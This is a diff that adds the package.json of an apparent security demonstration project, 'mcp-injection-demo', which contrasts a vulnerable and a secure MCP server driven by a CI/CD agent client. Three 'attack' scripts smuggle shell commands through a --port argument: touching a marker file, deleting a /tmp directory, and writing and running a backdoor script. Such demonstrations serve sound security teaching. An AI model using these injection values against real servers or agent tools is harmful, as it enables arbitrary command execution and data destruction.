@@ -1,0 +1,36 @@
+{
+  "name": "mcp-injection-demo",
+  "version": "1.0.0",
+  "description": "Automated CI/CD Bot + MCP Server: From Real-World Productivity to Real-World Exploits",
+  "main": "server/mcp_vulnerable.js",
+  "type": "module",
+  "scripts": {
+    "start": "node server/mcp_vulnerable.js",
+    "start:vulnerable": "node server/mcp_vulnerable.js",
+    "start:secure": "node server/mcp_secure.js",
+    "test": "node tests/test_vulnerable.js && node tests/test_secure.js",
+    "demo": "node server/agent_client.js",
+    "seed": "node scripts/seed_demo_data.js",
+    "cleanup": "bash scripts/cleanup.sh",
+    "attack:type-coercion": "node server/agent_client.js --port='8080; touch /tmp/type_coercion_owned; #'",
+    "attack:chain": "node server/agent_client.js --port='8080; echo \"123; rm -rf /tmp/demo; #\" #'",
+    "attack:backdoor": "node server/agent_client.js --port='8080; echo \"#!/bin/bash\" > /tmp/back.sh && echo \"echo \\\"Backdoor activated\\\"\" >> /tmp/back.sh && chmod +x /tmp/back.sh && /tmp/back.sh; #'"
+  },
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^0.5.0",
+    "express": "^4.18.2",
+    "cors": "^2.8.5",
+    "helmet": "^7.0.0",
+    "winston": "^3.10.0",
+    "dotenv": "^16.3.1",
+    "zod": "^3.22.4"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.1",
+    "jest": "^29.6.2",
+    "supertest": "^6.3.3"
+  },
+  "keywords": ["mcp", "security", "command-injection", "ci-cd", "devops", "demo"],
+  "author": "Security Research Team",
+  "license": "MIT"
+} 
